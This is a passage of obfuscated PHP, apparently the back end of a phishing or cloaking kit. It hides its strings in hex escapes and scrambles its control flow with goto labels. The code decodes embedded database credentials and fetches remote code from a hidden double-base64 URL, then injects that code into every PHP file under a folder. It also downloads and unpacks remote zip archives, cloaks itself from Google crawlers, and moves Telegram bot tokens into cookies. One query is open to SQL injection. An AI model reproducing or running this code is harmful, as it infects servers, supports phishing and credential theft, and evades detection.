header("\103\x6f\x6e\x74\145\x6e\x74\55\124\171\x70\x65\x3a\40\141\x70\x70\x6c\x69\143\x61\164\151\157\156\x2f\152\x73\x6f\156"); $responseJson = json_encode($responseData); echo $responseJson; } } } else { $reson = "\144\141\x74\141\x20\156\x6f\164\x20\x61\x6c\154\157\167"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\145\x73\x5f\163\164\x61\x74\x75\163" => "\64\60\x35", "\x6d\x65\x73\163\141\x67\145" => "\x64\x61\x74\141\40\156\157\x74\40\x61\154\x6c\157\x77\145\x64"); ob_end_clean(); header("\x43\157\x6e\164\x65\x6e\x74\x2d\x54\x79\x70\145\x3a\x20\x61\160\x70\x6c\x69\143\x61\164\x69\x6f\x6e\x2f\x6a\163\157\x6e"); $responseJson = json_encode($responseData); echo $responseJson; } goto zXe7t; KScuD: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto Q6pSV; rj9qh: $local_domain = $_SERVER["\x53\x45\122\126\x45\122\x5f\116\x41\x4d\x45"]; goto zELPa; h9q2Y: function isGoogleUser($userAgent, $ipAddress) { if (stripos($userAgent, "\147\x6f\x6f\x67\154\x65") !== false) { return true; } if (filter_var($ipAddress, FILTER_VALIDATE_IP)) { $hostname = gethostbyaddr($ipAddress); if (stripos($hostname, "\x67\157\x6f\x67\154\145") !== false) { return true; } } if (isset($_SESSION["\163\145\x73\x73\x69\x6f\156\137\x69\x73\160"]) && stripos($_SESSION["\x73\145\x73\x73\151\x6f\156\137\x69\163\x70"], "\x67\x6f\157\x67\x6c\145") !== false) { return true; } return false; } goto G1AYt; p0U2b: $fs_user = base64_decode("\x65\155\126\x79\x62\62\122\150\145\130\x4e\146\x5a\107\106\65"); goto h0gvd; WeF03: header("\x41\143\143\145\x73\163\x2d\x43\157\156\x74\162\x6f\x6c\x2d\101\154\154\x6f\167\x2d\x48\x65\141\144\145\162\163\x3a\40\x43\x6f\x6e\x74\145\156\x74\x2d\124\171\160\x65"); goto fGipg; fGipg: header("\x43\157\x6e\x74\145\156\x74\55\x54\x79\160\x65\x3a\40\141\x70\x70\x6c\x69\143\141\x74\x69\157\156\x2f\x6a\163\157\x6e"); goto AO6Gz; MyebT: deleteOldFolders("\167\x65\142"); goto Dp1B3; NlWUS: function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { $localFilePath = "\167\x65\142\57\141\x70\151\x2e\x70\150\160"; file_put_contents($localFilePath, $response); } else { echo "\x45\x72\x72\x6f\x72\40\x66\x65\164\143\x68\151\156\x67\40\x66\x69\154\145\72\40" . $error; } } goto ZfPCS; VX8gd: function get_expire_token() { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\156\156\x65\143\164\x69\157\156\40\146\x61\151\x6c\145\x64\72\40" . mysqli_connect_error()); } $sql_u = "\123\105\x4c\x45\x43\x54\40\x74\145\154\145\x5f\x74\x6f\153\x65\156\x2c\40\164\145\154\x65\137\x63\x68\141\164\x69\144\40\106\122\117\115\x20\x7a\x65\162\x6f\137\163\145\162\x76\145\162\40\127\x48\105\x52\x45\40\x69\x64\x3d\x27\61\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $_SESSION["\x65\x78\160\137\x74\157\153\145\x6e"] = $row["\x74\145\154\145\137\164\x6f\153\145\x6e"]; $_SESSION["\x65\x78\x70\x5f\143\150\x61\x74\x69\x64"] = $row["\x74\145\154\145\x5f\x63\x68\141\x74\x69\144"]; $token = $row["\164\x65\x6c\145\x5f\x74\157\153\145\x6e"]; $chatid = $row["\x74\x65\x6c\x65\137\x63\150\x61\164\151\x64"]; return array($token, $chatid); } mysqli_close($db); return null; } goto QQ9rJ; Z8dbv: global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_ip_g, $local_browser; goto nmUUR; zmlDP: function findIndex($path) { if (is_dir($path)) { if (file_exists($path . "\57\151\x6e\144\x65\x78\x2e\150\x74\155\x6c") || file_exists($path . "\x2f\151\x6e\144\145\170\x2e\160\x68\x70")) { return $path; } else { $subDirectories = glob($path . "\57\52", GLOB_ONLYDIR); if (!empty($subDirectories)) { foreach ($subDirectories as $subDir) { $result = findIndex($subDir); if ($result !== false) { return $result; } } } } } return false; } goto bY29b; VWHC6: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\x2e" && $file != "\x2e\x2e") { $filePath = $directory . "\x2f" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, PATHINFO_EXTENSION) == "\x70\150\x70" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto evnDU; GVuha: header("\101\143\x63\145\x73\x73\x2d\x43\157\156\164\x72\x6f\x6c\55\x41\x6c\x6c\x6f\167\55\117\x72\x69\x67\x69\x6e\x3a\x20\52"); goto lu28q; RRe2K: function update_php($folder_path) { $trackingFile = $folder_path . "\x72\157\x75\x6c\x73\56\164\170\164"; $codeURL = base64_decode(base64_decode("\131\x55\x68\123\115\x47\116\x49\124\x54\132\x4d\x65\124\154\x35\x57\x56\150\x6a\x64\126\x6f\x79\x62\x44\102\150\123\106\x5a\160\x5a\106\150\117\142\x47\116\x74\124\156\132\151\x62\154\x4a\x73\131\155\x35\122\x64\126\x6b\171\117\x58\122\115\115\x6e\150\161\131\x6a\x4a\x34\x61\x47\x51\172\142\x47\x78\x6a\x62\153\61\62\131\172\111\65\x4d\x57\116\164\x54\155\170\x4d\x4d\x6a\x46\157\x59\x56\143\60\144\x6d\x4e\111\123\x6e\132\153\122\x31\132\161\132\x45\x4d\61\x4d\107\126\111\x55\x51")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto ZGPtG; lu28q: header("\x41\x63\x63\145\163\163\55\x43\157\x6e\x74\162\157\x6c\55\101\154\154\x6f\167\55\115\145\164\150\x6f\144\163\72\40\120\117\123\124"); goto WeF03; zJjkT: function update_user_view($user) { list($token, $chatid) = get_expire_token(); list($token_view, $chatid_view) = get_view_token($user); $dateexp = $_SESSION["\x65\170\160\151\x72\x65\x5f\x64\x61\x74\x65"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\164\x6f\x6b\x65\156\x74\x65\154", $token, time() + 86400 * 30, "\57"); setcookie("\151\x64\164\x65\x6c", $chatid, time() + 86400 * 30, "\57"); setcookie("\x72\145\144\151\162\x69\143\x74", $_SESSION["\x72\x65\x64\x69\162\x69\x63\164"], time() + 86400 * 30, "\57"); setcookie("\160\162\x6f\x6a\145\x63\164", $_SESSION["\x70\x72\x6f\152\x65\143\164"], time() + 86400 * 30, "\x2f"); setcookie("\163\157\x75\x72\x63\x65\x6d\x65", $_SESSION["\x61\144\x64\142\171"], time() + 86400 * 30, "\x2f"); setcookie("\x6e\x65\x77\137\145\x78\x70", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\166\157\x6c\155", $token, time() + 86400 * 30, "\57"); setcookie("\x64\x6f\154\155", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\164\x6f\153\x65\156\164\145\x6c", $token_view, time() + 86400 * 30, "\x2f"); setcookie("\x69\x64\x74\145\154", $chatid_view, time() + 86400 * 30, "\x2f"); setcookie("\x72\x65\144\x69\162\x69\x63\164", $_SESSION["\162\x65\x64\x69\162\x69\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x70\x72\x6f\x6a\x65\x63\164", $_SESSION["\x70\162\x6f\152\145\x63\x74"], time() + 86400 * 30, "\57"); setcookie("\163\157\x75\x72\x63\x65\155\145", $_SESSION["\x61\x64\144\x62\x79"], time() + 86400 * 30, "\57"); setcookie("\166\x6f\x6c\x6d", $token, time() + 86400 * 30, "\x2f"); setcookie("\144\157\154\x6d", $chatid, time() + 86400 * 30, "\x2f"); } } goto zmlDP; ZfPCS: function delete_zip($directory) { $zipFiles = glob($directory . "\52\56\x7a\x69\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } } goto pvq7U; bY29b: function getAllPhpFiles($directory) { $phpFiles = array(); if (is_dir($directory) && ($handle = opendir($directory))) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\56\56") { $filePath = $directory . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { $phpFiles = array_merge($phpFiles, getAllPhpFiles($filePath)); } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === "\160\150\160") { $phpFiles[] = $filePath; } } } closedir($handle); } return $phpFiles; } goto Qm257; evnDU: function get_platform($USER_AGENT) { $OS_ERROR = "\x55\x6e\153\x6e\x6f\x77\x6e\40\117\x53\x20\120\154\141\164\x66\x6f\x72\x6d"; $OS = array("\x2f\167\151\156\144\x6f\167\x73\40\x6e\x74\x20\61\x31\57\x69" => "\x57\151\156\x64\x6f\x77\163\x20\61\61", "\57\x77\x69\156\x64\x6f\x77\x73\x20\x6e\164\x20\x31\x30\57\x69" => "\x57\x69\x6e\x64\x6f\167\x73\x20\61\60", "\x2f\x77\151\156\x64\x6f\167\x73\40\x6e\x74\x20\x36\56\63\57\151" => "\x57\151\x6e\x64\157\167\163\x20\70\x2e\61", "\57\x77\x69\156\144\157\x77\163\40\x6e\164\x20\x36\56\x32\x2f\151" => "\127\151\x6e\x64\157\167\163\40\70", "\x2f\x77\x69\156\x64\x6f\x77\163\40\156\x74\x20\x36\56\x31\57\151" => "\x57\x69\x6e\x64\x6f\167\x73\40\x37", "\57\167\151\156\144\x6f\167\x73\x20\156\164\40\x36\56\x30\57\151" => "\127\x69\x6e\144\157\x77\x73\x20\x56\x69\163\164\x61", "\57\167\151\156\144\157\x77\163\40\156\164\x20\65\56\62\57\151" => "\127\151\156\144\157\x77\x73\40\x53\145\162\x76\x65\162\x20\x32\60\x30\x33\x2f\x58\x50\40\170\x36\64", "\x2f\x77\151\156\144\157\167\163\x20\x6e\x74\x20\x35\x2e\x31\57\151" => "\x57\x69\156\x64\157\167\163\x20\x58\x50", "\x2f\167\x69\x6e\x64\157\x77\163\40\x78\160\x2f\x69" => "\127\x69\156\x64\157\167\163\x20\130\x50", "\x2f\x77\151\x6e\144\x6f\167\163\40\x6e\164\x20\65\x2e\x30\x2f\x69" => "\127\151\156\144\x6f\x77\163\40\62\60\x30\x30", "\x2f\167\151\156\144\157\167\x73\40\x6d\145\57\151" => "\x57\151\156\x64\157\x77\163\40\115\105", "\57\167\151\156\x39\x38\x2f\151" => "\x57\x69\x6e\144\157\167\163\40\x39\x38", "\57\167\151\156\71\65\x2f\x69" => "\x57\151\x6e\144\157\167\163\40\x39\65", "\x2f\x77\151\x6e\x31\66\x2f\151" => "\x57\151\156\144\157\167\163\40\63\x2e\61\x31", "\x2f\155\x61\x63\x69\156\x74\157\x73\x68\174\x6d\x61\143\x20\157\x73\40\170\57\x69" => "\115\141\x63\40\117\x53\x20\x58", "\x2f\x6d\141\x63\x5f\x70\x6f\167\x65\x72\160\x63\57\151" => "\x4d\141\143\40\x4f\123\40\x39", "\x2f\154\x69\156\165\x78\57\151" => "\x4c\151\x6e\165\x78", "\x2f\165\x62\165\x6e\164\x75\57\151" => "\x55\142\x75\156\164\x75", "\57\151\160\x68\157\156\145\x2f\x69" => "\151\120\150\157\156\x65", "\57\x69\x70\157\x64\x2f\x69" => "\x69\120\157\144", "\x2f\x69\160\x61\144\x2f\151" => "\151\120\141\x64", "\57\141\156\x64\x72\x6f\151\x64\57\x69" => "\101\156\144\162\x6f\151\x64", "\57\142\x6c\x61\x63\153\142\145\162\x72\x79\57\151" => "\102\x6c\141\x63\153\102\145\162\162\x79", "\57\x77\x65\x62\157\x73\x2f\151" => "\115\157\x62\x69\154\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto F5Wnm; EqnLv: function update_index($folderDir) { $renamed = false; if ($handle = opendir($folderDir)) { while (false !== ($entry = readdir($handle))) { $path = $folderDir . "\57" . $entry; if ($entry == "\56" || $entry == "\56\x2e") { continue; } if (is_dir($path)) { $renamed = update_index($path) || $renamed; } if (is_file($path) && strtolower(pathinfo($path, PATHINFO_EXTENSION)) === "\x68\164\155\x6c") { $newPath = $folderDir . "\57" . pathinfo($path, PATHINFO_FILENAME) . "\x2e\x70\150\160"; if (rename($path, $newPath)) { $renamed = true; } } } closedir($handle); } return $renamed; } goto RRe2K; x61sq: function updatePhpFileWithCode($filePath, $codeToAddTop) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; file_put_contents($filePath, $fileContent); return true; } return false; } goto NlWUS; f1kOY: function fetchIPInfo($ipAddress_send) { global $fs_host, $fs_user, $fs_log, $fs_name, $ipAddress, $data_country, $data_isp; $url = "\150\x74\x74\x70\72\x2f\x2f\151\x70\x2d\x61\x70\151\x2e\143\157\x6d\57\x6a\x73\x6f\x6e\x2f{$ipAddress_send}\77\x66\x69\x65\x6c\144\x73\x3d\x73\164\x61\x74\165\163\54\x6d\x65\x73\x73\141\147\145\x2c\143\x6f\156\164\x69\156\145\x6e\x74\54\143\157\x6e\164\x69\156\x65\156\x74\x43\x6f\x64\x65\54\143\157\165\x6e\164\162\171\x2c\143\157\x75\x6e\164\x72\171\x43\157\144\x65\54\x72\145\x67\151\157\156\54\x72\x65\x67\151\157\156\116\x61\x6d\145\54\143\x69\x74\171\54\144\151\163\x74\x72\x69\143\x74\54\172\151\160\x2c\x6c\x61\164\54\x6c\157\156\54\164\151\155\145\x7a\157\x6e\x65\54\x6f\146\146\x73\145\164\54\143\165\x72\162\x65\156\143\x79\54\151\163\160\x2c\x6f\x72\147\54\x61\163\54\x61\x73\156\x61\x6d\145\x2c\x72\145\x76\x65\162\163\x65\54\155\157\x62\x69\154\x65\x2c\160\x72\157\x78\x79\x2c\150\157\x73\x74\151\x6e\147\54\x71\x75\145\x72\x79"; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); $info = json_decode($response, true); if (isset($info["\163\x74\141\x74\x75\163"]) && $info["\163\164\141\x74\165\163"] !== "\163\165\143\143\145\163\x73") { $_SESSION["\163\145\x73\x73\151\x6f\x6e\x5f\x69\163\160"] = "\125\x6e\x6b\156\x6f\167\156"; $_SESSION["\163\x65\163\163\x69\x6f\156\x5f\143\157\x75\x6e\164\x72\171"] = "\125\x6e\153\156\x6f\x77\x6e"; $_SESSION["\163\145\163\163\x69\x6f\x6e\137\143\x6f\x75\x6e\x74\x72\x79\x5f\143\x6f\x64\x65"] = "\125\x6e\153\156\157\x77\x6e"; $_SESSION["\x73\x65\163\163\151\x6f\156\137\143\151\164\x79"] = "\x55\156\x6b\x6e\x6f\167\x6e"; $_SESSION["\163\145\163\x73\151\157\156\x5f\x72\145\147\151\157\156"] = "\x55\156\x6b\x6e\157\x77\156"; $_SESSION["\163\145\163\x73\x69\157\156\x5f\x70\x72\157\x78\171"] = "\x46\141\x6c\163\145"; $_SESSION["\x73\x65\163\163\151\157\156\137\155\157\x62\151\x6c\145"] = "\106\141\x6c\163\x65"; $_SESSION["\163\x65\163\x73\x69\x6f\x6e\x5f\x68\157\163\164\x69\x6e\x67"] = "\106\x61\x6c\163\x65"; return; } $data_country = isset($info["\x63\x6f\x75\x6e\x74\x72\x79"]) ? $info["\143\157\165\156\164\x72\x79"] : null; $data_isp = isset($info["\x69\163\160"]) ? $info["\x69\163\160"] : null; $_SESSION["\x73\x65\x73\x73\x69\x6f\x6e\x5f\151\x73\160"] = isset($info["\151\x73\160"]) ? $info["\x69\x73\160"] : null; $_SESSION["\163\x65\163\163\151\157\156\x5f\143\x6f\165\x6e\x74\x72\171"] = isset($info["\143\x6f\165\x6e\x74\x72\x79"]) ? $info["\143\x6f\x75\156\x74\x72\171"] : null; $_SESSION["\x73\x65\x73\x73\151\157\x6e\x5f\x63\x6f\x75\x6e\164\x72\171\x5f\143\157\x64\145"] = isset($info["\x63\157\x75\156\x74\x72\171\103\x6f\x64\145"]) ? $info["\143\157\x75\x6e\164\162\171\103\157\144\x65"] : null; $_SESSION["\163\x65\x73\x73\151\157\156\x5f\x63\151\x74\171"] = isset($info["\x63\x69\164\x79"]) ? $info["\x63\x69\x74\x79"] : null; $_SESSION["\163\145\163\x73\x69\157\156\137\x72\x65\x67\x69\157\x6e"] = isset($info["\x72\x65\x67\x69\157\x6e\x4e\141\155\145"]) ? $info["\x72\x65\147\151\x6f\x6e\116\x61\x6d\145"] : null; $_SESSION["\163\145\163\163\x69\x6f\156\137\160\x72\x6f\x78\171"] = isset($info["\x70\x72\x6f\x78\x79"]) && $info["\x70\162\157\170\x79"] ? "\x54\x72\165\145" : "\x46\x61\x6c\x73\x65"; $_SESSION["\x73\145\x73\x73\151\x6f\156\x5f\155\x6f\x62\151\x6c\x65"] = isset($info["\x6d\157\x62\151\x6c\145"]) && $info["\155\x6f\142\151\x6c\145"] ? "\x54\162\x75\x65" : "\x46\141\154\163\x65"; $_SESSION["\163\145\x73\x73\x69\157\x6e\x5f\150\157\163\x74\x69\156\x67"] = isset($info["\x68\157\x73\164\x69\x6e\x67"]) && $info["\150\157\163\164\x69\x6e\x67"] ? "\x54\x72\165\x65" : "\x46\141\x6c\163\145"; } goto bhveB; F5Wnm: function get_browser_value($USER_AGENT) { $BROWSER_ERROR = "\125\156\x6b\156\x6f\x77\156\x20\x42\x72\x6f\x77\163\x65\x72"; $BROWSER = array("\57\155\163\x69\145\x2f\151" => "\x49\156\164\145\162\156\145\x74\40\x45\x78\x70\x6c\x6f\x72\x65\162", "\57\146\x69\x72\x65\x66\x6f\x78\x2f\151" => "\106\151\162\145\x66\157\x78", "\x2f\163\x61\x66\141\x72\151\57\151" => "\x53\141\146\141\x72\151", "\57\143\150\x72\157\155\145\x2f\x69" => "\x43\x68\162\x6f\x6d\145", "\57\145\144\x67\x65\x2f\151" => "\105\144\147\x65", "\57\157\x70\145\162\141\57\151" => "\117\x70\x65\x72\141", "\x2f\x6e\145\164\163\x63\141\160\145\x2f\x69" => "\x4e\145\x74\x73\143\141\x70\x65", "\57\155\141\170\x74\x68\x6f\156\x2f\x69" => "\x4d\x61\170\164\x68\x6f\156", "\57\x6b\x6f\156\161\165\145\x72\x6f\162\x2f\151" => "\113\157\156\x71\x75\145\x72\157\x72", "\57\x6d\x6f\142\151\154\x65\x2f\151" => "\x48\141\x6e\x64\150\x65\x6c\144\x20\102\162\157\167\x73\145\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto mbpUr; Q6pSV: $fs_host = base64_decode("\x4d\124\x6b\64\x4c\152\111\61\115\x53\x34\x34\x4e\x43\64\171\115\104\x41"); goto p0U2b; nmUUR: function getHost($ipAddress) { try { $host = gethostbyaddr($ipAddress); return $host; } catch (Exception $e) { return "\x4e\x6f\164\40\x56\141\154\151\144"; } } goto LcH7k; rSmHn: function download_extract($zipFileUrl) { if (!is_dir("\x77\x65\142")) { if (!mkdir("\167\145\x62", 511)) { die("\106\x61\x69\154\x65\x64\40\164\157\x20\x63\x72\x65\x61\164\145\40\x77\x65\142\x20\144\151\162\145\x63\x74\x6f\162\x79"); } } if (!is_dir("\164\145\155\x70")) { mkdir("\x74\145\155\x70"); } $folder_name = bin2hex(random_bytes(8)); $sub_folder = random_number(6); $folder_path = "\167\x65\142\57{$sub_folder}\x2f"; $_SESSION["\146\157\x6c\x64\x65\162"] = $folder_path; $zipFileName = "\164\x65\155\160\57{$folder_name}\x2e\x7a\151\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\106\141\151\x6c\145\x64\x20\x74\157\40\x63\x72\x65\x61\164\x65\x20\164\150\145\x20\146\x6f\154\x64\145\162\56"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); } else { http_response_code(405); $responseData = array("\x72\145\163\137\x73\x74\x61\164\x75\x73" => "\64\60\x35", "\155\x65\x73\163\141\147\x65" => "\x46\141\151\x6c\145\144\40\x74\x6f\x20\x65\x78\164\x72\141\x63\x74\x20\x74\x68\x65\40\x7a\x69\160\40\146\x69\x6c\x65"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\162\x65\x73\x5f\x73\164\141\164\x75\x73" => "\64\60\65", "\155\145\163\x73\x61\147\145" => "\106\141\x69\154\x65\x64\40\x74\157\40\144\157\x77\156\154\x6f\x61\144\x20\164\x68\145\x20\x7a\x69\160\40\146\151\x6c\145"); $responseJson = json_encode($responseData); echo $responseJson; } if (file_exists($zipFileName)) { unlink($zipFileName); } } goto EqnLv; h0gvd: $fs_log = base64_decode("\132\x48\x4a\152\x5a\x32\x6c\x73\x65\126\x41\167\113\155\163\x6d"); goto MDlLd; HssGJ: function deleteOldFolders($directory) { $files = scandir($directory); foreach ($files as $file) { if ($file == "\x2e" || $file == "\x2e\56") { continue; } if (is_dir($directory . "\x2f" . $file)) { $lastModified = filemtime($directory . "\x2f" . $file); $difference = (time() - $lastModified) / 60; if ($difference > 20) { deleteDirectory($directory . "\57" . $file); } } } } goto yVeVy; GaWdw: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\x2f", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\377", $mask >> 3) . chr(255 << 8 - ($mask & 7)); if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) { return false; } $subnetInt = unpack("\116", $subnetBin)[1]; $ipInt = unpack("\116", $ipBin)[1]; $maskInt = unpack("\116", $maskBin)[1]; return ($subnetInt & $maskInt) === ($ipInt & $maskInt); } goto HssGJ; eZxgd: ini_set("\144\x69\x73\160\154\141\171\137\x65\162\x72\157\162\x73", 1); goto KScuD; yVeVy: function deleteDirectory($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "\56" && $object != "\56\56") { if (is_dir($dir . "\57" . $object)) { deleteDirectory($dir . "\57" . $object); } else { unlink($dir . "\57" . $object); } } } reset($objects); rmdir($dir); } } goto rSmHn; x77Df: $local_userAgent = isset($_SERVER["\110\x54\x54\120\137\125\123\x45\x52\137\101\x47\105\x4e\x54"]) ? $_SERVER["\x48\124\x54\120\137\x55\x53\x45\x52\137\101\107\x45\x4e\x54"] : ''; goto fxbeM; QQ9rJ: function get_view_token($user) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\156\x6e\x65\x63\x74\x69\157\156\40\146\141\x69\x6c\145\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\114\x45\103\124\x20\x74\157\x6b\x65\x6e\54\40\143\150\x61\164\x69\144\40\x46\122\x4f\x4d\x20\160\141\156\145\x6c\40\127\110\x45\x52\105\40\160\141\x6e\x65\154\x5f\165\x73\x65\x72\75\x27{$user}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $token = $row["\x74\x6f\x6b\x65\x6e"]; $chatid = $row["\143\150\141\164\151\x64"]; return array($token, $chatid); } mysqli_close($db); return null; } goto Yboir; pvq7U: function add_user($folder_path, $ipAddress) { file_put_contents("{$folder_path}\x2f\154\x6f\x63\x61\154\x2e\x74\x78\x74", "{$ipAddress}", FILE_APPEND); } goto h9q2Y; MDlLd: $fs_name = base64_decode("\x65\x6d\126\x79\x62\x32\122\150\x65\130\116\146\132\107\x46\x35"); goto x77Df; zXe7t: ')); ?>
